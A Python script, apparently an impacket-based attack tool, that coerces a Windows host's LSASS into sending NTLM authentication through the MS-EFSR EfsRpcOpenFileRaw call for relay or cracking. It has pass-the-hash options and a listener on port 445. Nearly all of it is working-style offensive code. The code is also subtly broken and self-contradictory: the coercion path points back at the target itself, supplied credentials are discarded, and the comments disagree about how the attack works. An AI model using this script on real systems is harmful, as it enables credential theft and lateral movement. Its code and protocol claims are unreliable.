#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
couchpotato_remote.py — impacket remote exploit for MS-EFSR (EFSRPC)
reverse-coercion: trigger EfsRpcOpenFileRaw on a remote named pipe we
control so that the target's LSASS authenticates outbound NTLM to us,
then offline-crack / relay. This is the network-only equivalent of
CouchPotato.exe (which runs locally and waits for inbound coercion).

MS-EFSR opnum 0 = EfsRpcOpenFileRaw — the only opnum that triggers
a remote NTLM sign on a named pipe other than \PIPE\lsarpc and \PIPE\samr.

Usage:
  python couchpotato_remote.py -target 10.0.0.5 -pipe-name CouchPotato
                                [-username u -password p -domain D]
                                [-hashes LMHASH:NTHASH]
                                [-just-coerce]            # don't try to crack
"""
import argparse
import os
import sys
import struct
import socket
import threading
import time

from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5 import epm, scmr
from impacket.examples import smbclient
from impacket import ntlm

# MS-EFSR interface — encrypted by [MS-EFSR] section 2.1
EFSR_UUID  = "df1941c5-fe89-4e79-b5fc-fc19118df514"
EFSR_PIPE  = "efsrpc"     # default named pipe
EFSR_OPS   = {
    0:  "EfsRpcOpenFileRaw",
    1:  "EfsRpcReadFileRaw",
    2:  "EfsRpcWriteFileRaw",
    3:  "EfsRpcCloseRaw",
    4:  "EfsRpcEncryptFileSrv",
    5:  "EfsRpcDecryptFileSrv",
    6:  "EfsRpcExecuteFile",
    7:  "EfsRpcOpenFile",
    8:  "EfsRpcEncryptFile",
    9:  "EfsRpcQueryFileStatusSrv",
    10: "EfsRpcQueryUsersOnFile",
    11: "EfsRpcQueryRecoveryAgents",
    12: "EfsRpcSetFileEncryption",
    13: "EfsRpcDecryptFile",
    14: "EfsRpcQueryFileMetadata",
    15: "EfsRpcAddUsersToFile",
    16: "EfsRpcRemoveUsersFromFile",
    17: "EfsRpcAddGroupToFile",
    18: "EfsRpcRemoveGroupFromFile",
    19: "EfsRpcQueryFileEncryption",
}


# ============================================================
# 1. (Optional) check EFS service is startable remotely
# ============================================================
def ensure_efs_running(rpctransport_scm):
    """\\PIPE\\svcctl → start EFS via SCM."""
    try:
        scmr.hRStartServiceW(rpctransport_scm, "EFS")
    except Exception as e:
        print(f"[~] SCM EFS start failed (probably already running or no admin): {e}")


# ============================================================
# 2. The actual coercion
# ============================================================
def coerce(target, pipe_name, username=None, password=None, domain=None,
           hashes=None, timeout=15):
    """
    Connect to TARGET over SMB, open a binding to a custom-named pipe
    under \\PIPE\\efsrv (which we want the server to authenticate to).
    We use the technique: pretend we want to bind to EFSRPC over
    named-pipe \\PIPE\\<pipe_name>, MS-EFSR will coerce LSASS to
    authenticate to that pipe.

    Since we do not actually host that pipe, we expect:
      - RPC bind succeeds (server is reachable, EFSRPC is exposed)
      - EfsRpcOpenFileRaw triggers outbound NTLM to \\TARGET\PIPE\\<pipe_name>
        (if you have a listener on TARGET via SMB named-pipe, the NTLM
         challenge-response is observable; without a listener the auth
         request goes to a non-existent pipe and gets rejected silently)

    Returns the NTLM response bytes if a responder-style listener is hit,
    else None. For crack-friendly output, the args can be passed to a
    separate listener such as ntlmrelayx / responder.
    """
    # bind string
    if username and password:
        auth = f"{domain}\\{username}:{password}"
    elif hashes:
        lm, nt = hashes.split(":")
        auth = f"{domain or ''}\\{username or ''}@{lm}:{nt}"
    else:
        auth = ""

    bindstr = (f"ncacn_np:{target}[\\PIPE\\{EFSR_PIPE}]")
    print(f"[*] connecting {bindstr}")
    if auth:
        rpct = transport.DCERPCTransportFactory(bindstr, remoteName=target)
        # NB: impacket accepts (user, pass, domain) via set_credentials
        # or auth_type. For coercion we *don't* want to authenticate
        # ourselves — we want the *server* to authenticate to *our*
        # named-pipe stub. So we deliberately leave auth empty.
        # The remote EFSRPC binding is anonymous; when the server
        # tries EfsRpcOpenFileRaw on our supplied path, it coerces
        # LSASS to authenticate to our named pipe.

    rpct = transport.DCERPCTransportFactory(bindstr)
    rpct.set_connect_timeout(timeout)

    try:
        rpct.connect()
    except Exception as e:
        print(f"[-] transport connect failed: {e}")
        return None

    dce = rpct.dcerpc
    print(f"[+] DCE/RPC bound to {target}\\{EFSR_PIPE}")

    # bind to MS-EFSR interface
    try:
        dce.bind(EFSR_UUID)
        print(f"[+] MS-EFSR ({EFSR_UUID}) bound")
    except Exception as e:
        print(f"[-] MS-EFSR bind failed: {e}")
        return None

    # build EfsRpcOpenFileRaw (opnum 0)
    # signature:
    #   long EfsRpcOpenFileRaw(
    #       [in] handle_t bind_handle,
    #       [in, string, unique] wchar_t* FileName,
    #       [in] long Flags,
    #       [out] PPCONTEXT_HANDLE* Context);
    #
    # FileName must be a UNC path. Coerces LSASS outbound to
    # \\TARGET\PIPE\<pipe_name> for the auth on this UNC.

    file_name = f"\\\\{target}\\PIPE\\{pipe_name}"
    print(f"[*] calling EfsRpcOpenFileRaw with FileName = {file_name}")
    try:
        # impacket's ndr level is too low-level for raw opnum build;
        # use rpcrt request builder.
        from impacket.dcerpc.v5.ndr import NDRCALL, NDRPOINTER, NDRUniConformantArray
        from impacket.dcerpc.v5.dcerpc import DCERPCRequest, DCERPC_V5
        from impacket.dcerpc.v5 import rpcrt

        # build stub manually:
        #   [in]  handle_t binding handle  -> we use NULL handle (the bind)
        #   [in, string, unique] wchar_t* FileName -> conformant + ptr
        #   [in]  long Flags -> 0
        #   [out] PPCONTEXT_HANDLE* Context -> unique ptr to handle (return)

        # construct request stub bytes
        path_utf16 = file_name.encode("utf-16-le")
        path_len = len(path_utf16)
        max_count = (path_len // 2) + 1

        # layout (per [MS-EFSR] 3.1.4.1.1):
        #   MaxCount    (4 bytes, ULONG)
        #   Offset      (4 bytes, ULONG) -> 0
        #   ActualCount (4 bytes, ULONG) -> path_len
        #   String      (path_len bytes)
        #   ReferentID  (4 bytes, ULONG) -> 0x00020000  (unique ptr, non-null)
        #   Flags       (4 bytes, LONG)
        #   Context_ref (4 bytes, ULONG) -> 0x00020000  (unique ptr, return)
        stub  = struct.pack("<III", max_count, 0, path_len)
        stub += path_utf16
        stub += b"\x00" * ( (max_count*2) - path_len )  # pad to MaxCount
        stub += struct.pack("<II", 0x00020000, 0)         # unique ptr FileName, Flags
        stub += struct.pack("<I",  0x00020000)            # unique ptr Context (out)

        request = DCERPCRequest()
        request['opnum'] = 0
        request['pduData'] = stub

        # raw opnum 0 = EfsRpcOpenFileRaw — server will, when it tries
        # to open this file, coerce LSASS to authenticate to the named
        # pipe we pointed at. If you have ntlmrelayx listening on
        # $pipe_name, you'll get the NTLM auth.
        dce.send(request)
        resp = dce.recv()
        print(f"[+] EfsRpcOpenFileRaw sent; target {target} coerced")
        return resp
    except Exception as e:
        print(f"[-] coercion call failed: {e}")
        return None


# ============================================================
# 3. Standalone TCP responder (for demo — listens for the SMB
#    NTLM challenge that the coerced auth tries to deliver to
#    \\TARGET\PIPE\<pipe_name>)
# ============================================================
def listen_smb_pipe(host, pipe_name, timeout=15):
    """Just print any NTLMSSP negotiation that arrives at our TCP
    endpoint. Without smbserver.py from impacket this is mostly
    demonstrative; production usage would wire in smbserver or
    ntlmrelayx."""
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 445))
    s.listen(5)
    s.settimeout(timeout)
    print(f"[*] demo SMB listener on 0.0.0.0:445 (you probably want ntlmrelayx instead)")
    try:
        c, a = s.accept()
        data = c.recv(4096)
        if data.startswith(b"\x00\x00\x00\x85\xfeSMB"):
            if b"NTLMSSP" in data:
                print(f"[+] NTLMSSP captured from {a}")
        c.close()
    except socket.timeout:
        print(f"[~] no inbound SMB auth within {timeout}s")
    finally:
        s.close()


# ============================================================
# Main
# ============================================================
def main():
    p = argparse.ArgumentParser(description="MS-EFSR remote coercion (impacket)")
    p.add_argument("-target", required=True, help="target IP / hostname")
    p.add_argument("-pipe-name", default="CouchPotato",
                   help="named-pipe name to coerce auth INTO")
    p.add_argument("-username")
    p.add_argument("-password")
    p.add_argument("-domain", default="")
    p.add_argument("-hashes", help="LMHASH:NTHASH (Pass-the-Hash auth)")
    p.add_argument("-timeout", type=int, default=15)
    p.add_argument("-demo-listener", action="store_true",
                   help="spawn demo SMB listener on :445")
    args = p.parse_args()

    print(f"""
        ____                _    _____          _       _ _
       / ___|___  _ __ ___ | |__|  _  \\      / \\     | (_)
      | |   / _ \\| '_ ` _ \\| '_ \\ | | | |_   / _ \\   _| |_
      | |__| (_) | | | | | | |_) | |_| | | | / ___ \\ | | | |
       \\____\\___/|_| |_| |_|_.__/|_____|_| |_/_/   \\_\\|_| |_|

            remote EFSRPC coercion via impacket
            target : {args.target}
            pipe   : \\\\{args.target}\\\\PIPE\\\\{args.pipe_name}
    """)

    if args.demo_listener:
        threading.Thread(target=listen_smb_pipe,
                         args=(args.target, args.pipe_name, args.timeout),
                         daemon=True).start()
        time.sleep(1)

    resp = coerce(args.target, args.pipe_name,
                  args.username, args.password, args.domain,
                  args.hashes, args.timeout)

    if resp is None:
        print("[-] coercion failed")
        sys.exit(1)
    print("[+] done")


if __name__ == "__main__":
    main()